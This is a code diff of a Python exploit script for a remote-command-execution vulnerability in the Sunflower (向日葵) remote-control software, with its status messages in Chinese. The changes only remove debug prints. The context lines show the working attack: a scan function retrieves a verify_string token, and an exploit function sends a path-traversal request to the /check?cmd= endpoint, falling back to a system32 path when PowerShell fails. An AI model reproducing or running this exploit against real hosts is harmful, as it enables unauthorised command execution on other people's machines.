@@ -16,8 +16,6 @@ def scan_poc(ip, port):
 	try :
 		req = requests.get(url,headers=headers, timeout=7)
 		data = json.loads(req.text)
-		print(data,type(repr(data)))
-		print(data["verify_string"])
 		CID = data["verify_string"]
 		print(url+"存在向日葵漏洞")
 		return CID
@@ -25,7 +23,6 @@ def scan_poc(ip, port):
 		return "null"
 def exp_poc(ip, port):
 	CID = scan_poc(ip, port)
-	print(CID)
 	if CID == "null":
 		print(str(ip)+"不存在漏洞，也可能是已关闭")
 		return
@@ -38,7 +35,6 @@ def exp_poc(ip, port):
 	}
 	req = requests.get(url, headers=headers,timeout=30)
 	if req.text.find("error")>-1:
-		print(req.text.find("error"))
 		print("WindowsPowerShell不可用，尝试使用windows/system32/.....")
 		url = "http://"+str(ip) + ":"+str(port) +"/check?cmd=ping../../../../../../../../../../windows/system32/"
 		req = requests.get(url, headers=headers,timeout=30)
